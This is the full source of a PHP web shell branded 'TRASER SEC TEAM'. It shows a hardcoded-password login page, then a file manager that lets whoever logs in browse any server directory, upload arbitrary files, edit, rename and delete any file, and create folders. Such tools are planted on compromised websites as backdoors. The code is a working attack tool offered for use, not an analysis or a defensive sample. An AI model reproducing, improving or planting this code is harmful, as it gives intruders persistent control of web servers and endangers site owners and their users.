<?php
session_start();
$pass="SeniDariByte";
if(!isset($_SESSION["login"])){
if(isset($_POST["p"])&&$_POST["p"]===$pass){$_SESSION["login"]=1;header("Location:?");exit;}
echo '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title></head>
<body style="margin:0;background:#000;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh">
<img src="https://raw.githubusercontent.com/AlvaXPloit/ISI/refs/heads/main/alvaror.png" alt="TRASER SEC TEAM" style="width:300px"><div>
<form method="post" style="text-align:center"><input type="password" name="p" placeholder="Password" style="padding:10px;border:none;border-radius:5px;background:#111;color:#0f0">
<button style="padding:10px 15px;margin-left:5px;border:none;border-radius:5px;background:#0f0;color:#000">Login</button></form></body></html>';exit;}

$path=isset($_GET["d"])?realpath($_GET["d"]):getcwd();
if(!$path)$path=getcwd();

if(isset($_GET["logout"])){session_destroy();header("Location:?");exit;}
if(isset($_GET["del"])){@unlink($_GET["del"]);header("Location:?d=".urlencode($path));exit;}
if(isset($_POST["newfolder"])){@mkdir($path."/".$_POST["newfolder"]);header("Location:?d=".urlencode($path));exit;}
if(isset($_POST["upload"])){
$tmp=$_FILES["file"]["tmp_name"];
$name=basename($_FILES["file"]["name"]);
$target=$path."/".$name;
if(is_uploaded_file($tmp)){move_uploaded_file($tmp,$target);}
header("Location:?d=".urlencode($path));exit;
}
if(isset($_POST["editfile"])){file_put_contents($_POST["file"],$_POST["content"]);header("Location:?d=".urlencode($path));exit;}
if(isset($_GET["r"])){rename($_GET["r"],dirname($_GET["r"])."/".$_GET["new"]);header("Location:?d=".urlencode($path));exit;}

echo '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>haefohhhahfp</title>
<style>
body{margin:0;background:#000;color:#fff;font-family:monospace}
.header{background:#111;padding:10px;position:sticky;top:0;display:flex;justify-content:space-between;align-items:center}
a{color:#0f0;text-decoration:none;word-break:break-all}
.btn{background:#0f0;color:#000;border:none;padding:7px 12px;border-radius:5px}
input,textarea{background:#111;color:#0f0;border:none;padding:8px;border-radius:5px;width:100%;box-sizing:border-box}
.card{background:#111;margin:5px 0;padding:10px;border-radius:8px}
table{width:100%;border-collapse:collapse}
td{padding:8px;border-bottom:1px solid #222;word-break:break-all}
form.inline{display:inline}
@media(max-width:600px){td form{display:block;margin-top:5px}}
</style></head><body>';

echo '<div class="header"><div>Dir: '.$path.'</div><a href="?logout=1" style="color:#f33">Logout</a></div>';
echo '<div style="padding:10px">';

echo '<form method="post" enctype="multipart/form-data" class="card" style="display:flex;gap:5px;flex-wrap:wrap">
<input type="file" name="file" style="flex:1">
<button name="upload" class="btn">Upload</button></form>';

echo '<form method="post" class="card" style="display:flex;gap:5px">
<input name="newfolder" placeholder="New Folder" style="flex:1"><button class="btn">Create</button></form>';

if(isset($_GET["edit"])){
$f=$_GET["edit"];
$content=htmlspecialchars(file_get_contents($f));
echo '<form method="post" class="card"><input type="hidden" name="file" value="'.$f.'">
<textarea name="content" style="height:70vh">'.$content.'</textarea><button name="editfile" class="btn" style="margin-top:5px;width:100%">Save</button></form></div></body></html>';
exit;
}

echo '<div class="card"><table>';
if($path!="/")echo '<tr><td><a href="?d='.urlencode(dirname($path)).'">[..]</a></td><td></td></tr>';
$files=scandir($path);
foreach($files as $f){
if($f=="."||$f=="..")continue;
$fp=$path."/".$f;
echo '<tr><td>';
echo is_dir($fp)?'<a href="?d='.urlencode($fp).'">'.$f.'</a>':'<a href="?d='.urlencode($path).'&edit='.urlencode($fp).'">'.$f.'</a>';
echo '</td><td style="text-align:right">';
if(!is_dir($fp)){
echo '<a href="?d='.urlencode($path).'&del='.urlencode($fp).'" style="color:#f33;margin-right:10px">Delete</a>';
echo '<form class="inline" method="get"><input type="hidden" name="d" value="'.htmlspecialchars($path).'"><input type="hidden" name="r" value="'.htmlspecialchars($fp).'"><input name="new" placeholder="Rename" style="width:120px;background:#222;color:#0f0;border:none;padding:5px;border-radius:3px"><button class="btn">Go</button></form>';
}
echo '</td></tr>';
}
echo '</table></div></div></body></html>';
?>
